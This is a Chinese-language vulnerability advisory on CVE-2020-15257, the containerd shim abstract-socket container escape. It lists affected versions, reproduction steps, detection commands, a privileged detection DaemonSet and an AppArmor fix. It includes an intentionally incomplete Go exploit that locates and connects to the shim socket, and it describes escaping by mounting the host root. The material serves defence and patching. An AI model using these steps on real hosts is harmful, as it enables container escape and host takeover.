> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8Zel4oPXdctUE1kotti8Yw)

### 漏洞简介

containerd 是行业标准的容器运行时，可作为 Linux 和 Windows 的守护程序使用。在版本 1.3.9 和 1.4.3 之前的容器中，容器填充的 API 不正确地暴露给主机网络容器。填充程序的 API 套接字的访问控制验证了连接过程的有效 UID 为 0，但没有以其他方式限制对抽象 Unix 域套接字的访问。这将允许在与填充程序相同的网络名称空间中运行的恶意容器（有效 UID 为 0，但特权降低）导致新进程以提升的特权运行。

### 影响版本

containerd < 1.4.3  
containerd < 1.3.9

### 安全版本

containerd >= 1.4.3  
containerd >= 1.3.9

### 漏洞复现

1、首先安装有漏洞的 containerd 版本  
2、用 root 用户以共享主机网络的方式启动容器 sudo docker run -itd –network=host ubuntu:latest /bin/bash  
3、在容器内执行`cat /proc/net/unix | grep 'containerd-shim' | grep '@'`可看到抽象命名空间 Unix 域套接字  
4、根据漏洞描述通过图片中的抽象命名空间 Unix 域套接字可访问 dockerd-shim rpc api  
![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3ayVbPMbsUQSYCCmfo29ZSzZIKQMvmf6WrgA8DUodEfMWRPewPOXeIPbnPmz5Epjc3gUV8FD2ibOOg/640?wx_fmt=png)

### 漏洞应急与自测

为了便于验证用户环境中是否存在该漏洞，我们提供了 poc 镜像。使用方式如下：  
`sudo docker run -it --rm -v /:/host/ -v /var/run/docker.sock:/var/run/docker.sock --net=host hub.dosec.cn/library/poc:CVE-2020-15257`  
![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3ayVbPMbsUQSYCCmfo29ZSzykZN2HAODXcibTYs8iaT0CkLVF6bOqgY2wWGYm3fW61TEInZPk5TcAZw/640?wx_fmt=png)

为了便于用户在集群中验证该漏洞，可使用如下命令查看共享了主机网络的 pod  
`kubectl get pod --all-namespaces -o custom-columns=namespace:.metadata.namespace,CONTAINER:.spec.containers[0].name,NetWork:.spec.hostNetwork,hostname:.spec.nodeName,nodeIP:.status.hostIP | grep true`

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3ayVbPMbsUQSYCCmfo29ZSzdIBqeUWpaXrDJh43AGgsibSsjeTJFP1NECibNpZGa3uvMkloqeYtAU3g/640?wx_fmt=png)

当然也可以使用如下编排文件进行检测

```
apiVersion: apps/v1kind: DaemonSetmetadata:  name: cve-2020-15257  namespace: cvetestspec:  selector:    matchLabels:      name: cve  template:    metadata:      name: cve-2020-15257      labels:        name: cve    spec:     # restartPolicy: always      containers:      - name: cve-2020-15257        image: dosecteam/pocs:CVE-2020-15257        securityContext:          privileged: true        env:        - name: KUBERNETES_NODENAME          valueFrom:            fieldRef:              apiVersion: v1              fieldPath: spec.nodeName        volumeMounts:          - name: host-fs            mountPath: /host          - name: socket-fs            mountPath: /var/run/docker.sock      hostNetwork: true      volumes:        - name: host-fs          hostPath:            path: /        - name: socket-fs          hostPath:            path: /var/run/docker.sock
```

执行如下命令：

```
kubectl create ns cveteskubectl apply -f checkcve.yamlkubectl get po -n cvetest|awk '{print $1}' | xargs -i kubectl logs -n cvetest  {}
```

### 漏洞利用附非完整 exp

参考 containerd 官网源码，我们可以在容器内访问到该 socket 文件。然后可启动一个新的容器，该容器挂载宿主机根目录到容器内的 / host 目录，即可实现对宿主机完全读写，达到容器逃逸的目的。

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3ayVbPMbsUQSYCCmfo29ZSzhGicZKTAZxWEpt8SbSoIleIv7yBuiaiaqzQ7JtVMicQw7Uib2lQQ3zRKhkA/640?wx_fmt=png)

下面为非完整 exp。请自行脑补。

```
package mainimport (    "fmt"    "net"    "os"    "regexp")func getshimunixpath() (string, error) {    file, err := os.Open("/proc/net/unix")    if err != nil {        return "", err    }    var b []byte = make([]byte, 0x1fff)    file.Read(b)    defer file.Close()    socklist := string(b)    regString := "/containerd-shim/moby/[a-f 0-9]{64}/shim.sock"    reg, _ := regexp.Compile(regString)    path := reg.FindString(socklist)    if path == "" {        err = fmt.Errorf("no sock file found")        return "", err    }    path = "\x00" + path    return path, err}func main() {    shimunixpath, err := getshimunixpath()    if err != nil {        fmt.Println(err)        return    }    conn, err := net.Dial("unix", shimunixpath)    if err != nil {        fmt.Println(err)        return    }    //do something with this connection    //此处省略关键信息，自行脑部    //此处省略关键信息，自行脑部    //此处省略关键信息，自行脑部    defer conn.Close()}
```

### 漏洞修复

1.  升级 containerd 至最新版本。
    
2.  通过添加如 deny unix addr=@** 的 AppArmor 策略禁止访问抽象套接字。
    

应当注意，应停止并重新启动使用旧版本的容器填充垫片启动的容器，因为即使在升级后，运行中的容器仍将继续受到攻击。如果您没有为不受信任的用户提供在与垫片相同的网络名称空间中启动容器的能力（通常是 “主机” 网络名称空间，例如 docker run –net = host 或 hostNetwork：在 Kubernetes 窗格中为 true），并且以有效 UID 为 0 运行时，您就不会受到此问题的影响。

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3bW732RU7NAiaZc4JT6DxmZyUNeZGuxDkFCEEStghYzbBh4Va87vPYuw6llsvJzAmVg3I2f9icYTcKA/640?wx_fmt=png)